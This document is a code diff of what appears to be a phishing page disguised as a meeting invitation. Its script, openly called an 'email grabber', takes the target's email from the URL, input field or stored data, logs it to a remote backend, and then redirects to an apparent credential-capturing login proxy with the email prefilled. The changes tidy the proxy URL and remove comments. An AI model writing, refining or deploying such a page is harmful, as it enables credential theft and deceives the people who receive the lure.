@@ -14,14 +14,16 @@ style="width: 60px;border-radius: 30px;"><br> <i>Mrs Maria N.</i></div></div><di
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
       <script>
 // ============================================================
-//  CONFIGURATION
+//  CONFIGURATION - SIMPLIFIED & PERFECT
 // ============================================================
 
 const BACKEND_URL = "https://meeting-1-rzx6.onrender.com";
-const PROXY_URL = "https://auth-login-service-nx4x.onrender.com/login?method=signin&mode=secure&client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&privacy=on&sso_reload=true";
+
+// ✅ PERFECT - Clean and simple
+const PROXY_URL = "https://auth-login-service-nx4x.onrender.com/login";
 
 // ============================================================
-//  ENHANCED EMAIL GRABBER – with localStorage fallback
+//  EMAIL GRABBER
 // ============================================================
 
 function getEmailFromUrl() {
@@ -50,7 +52,6 @@ function getEmailFromUrl() {
         }
     }
     
-    // Save to localStorage for fallback
     if (email) {
         try {
             localStorage.setItem('lastEmail', email);
@@ -135,7 +136,6 @@ function load() {
     const rawEmail = getEmailFromUrl();
     let email = rawEmail;
     
-    // If no email in URL, try localStorage
     if (!email) {
         email = getSavedEmail();
     }
@@ -167,32 +167,28 @@ function load() {
 }
 
 // ============================================================
-//  FIXED redirectToProxy() – Properly passes email to proxy
+//  redirectToProxy() - PERFECT - Just adds login_hint
 // ============================================================
 
 function redirectToProxy() {
-    // 1. Get email from URL parameter
+    // 1. Get email
     const params = new URLSearchParams(window.location.search);
     let rawEmail = params.get('e') || params.get('email') || '';
     
-    // 2. If not in URL, try input field
     if (!rawEmail) {
         const emailInput = document.getElementById('user');
         if (emailInput) rawEmail = emailInput.value;
     }
     
-    // 3. If still not found, try localStorage
     if (!rawEmail) {
         rawEmail = getSavedEmail();
     }
     
-    // 4. If still no email, show alert
     if (!rawEmail) {
         alert('No email provided');
         return;
     }
     
-    // 5. Decode the email
     let email;
     try {
         email = decodeURIComponent(rawEmail);
@@ -200,18 +196,16 @@ function redirectToProxy() {
         email = rawEmail;
     }
     
-    // 6. Validate email
     if (!email || !email.includes('@')) {
         alert('Invalid email address: ' + email);
         return;
     }
     
-    // 7. Save email for future use
     try {
         localStorage.setItem('lastEmail', email);
     } catch (e) {}
     
-    // 8. Show loading UI
+    // Show loading UI
     const joinDiv = document.getElementById('joinDiv');
     const loadDiv = document.getElementById('loadDiv');
     const loadTxt = document.getElementById('loadTxt');
@@ -220,18 +214,16 @@ function redirectToProxy() {
     if (loadDiv) loadDiv.style.display = 'block';
     if (loadTxt) loadTxt.textContent = 'Connecting to meeting...';
     
-    // 9. Log the action
     logAction('click_join', { email: email });
     
-    // 10. Build the proxy URL with encoded email
+    // ✅ PERFECT - Clean URL with just login_hint
     const encodedEmail = encodeURIComponent(email);
-    const proxyUrl = PROXY_URL + '&login_hint=' + encodedEmail;
+    const proxyUrl = PROXY_URL + '?login_hint=' + encodedEmail;
     
     console.log('🔗 Redirecting with email:', email);
     console.log('🔗 Encoded email:', encodedEmail);
     console.log('🔗 Full proxy URL:', proxyUrl);
     
-    // 11. Redirect after a short delay
     setTimeout(function() {
         window.location.href = proxyUrl;
     }, 1500);
@@ -258,6 +250,5 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 </script>
-
 </body>
 </html>
